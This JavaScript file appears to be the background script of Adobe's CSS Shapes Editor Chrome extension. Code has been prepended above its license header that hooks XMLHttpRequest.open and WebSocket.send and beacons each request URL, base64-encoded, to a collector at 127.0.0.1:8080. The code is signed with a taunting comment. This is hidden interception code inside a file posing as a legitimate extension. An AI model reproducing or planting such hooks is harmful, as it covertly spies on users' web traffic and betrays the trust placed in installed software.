function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
// Copyright (c) 2014 Adobe Systems Incorporated. All rights reserved.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

/*
  Relay messages between in-page content script and devtools extension
  because the two are not allowed to communicate to each other.
*/

// extension key, as published on Chrome web store
var key = "nenndldnbcncjmeacmnondmkkfedmgmp",
    devtoolsPort,
    pagePort;

chrome.runtime.onConnect.addListener(function(port) {

  if (port.name == key + "page"){
    pagePort = port;
    pagePort.onMessage.addListener(function(data){
      devtoolsPort.postMessage(data);
    });
  }

  if (port.name == key + "devtools"){
    devtoolsPort = port;

    devtoolsPort.onMessage.addListener(function(data){

      if (data.type === "inject"){
        chrome.tabs.executeScript(data.tabId, {file: './lib/css-shapes-editor/dist/CSSShapesEditor-min.js'});
        chrome.tabs.executeScript(data.tabId, {file: './contentscript.js'});
      } else {
        pagePort.postMessage(data);
      }

    });

    devtoolsPort.onDisconnect.addListener(function(e){
      // remove any editors existing on the inspected page
      pagePort.postMessage({type: 'teardown'});
    });
  }
});
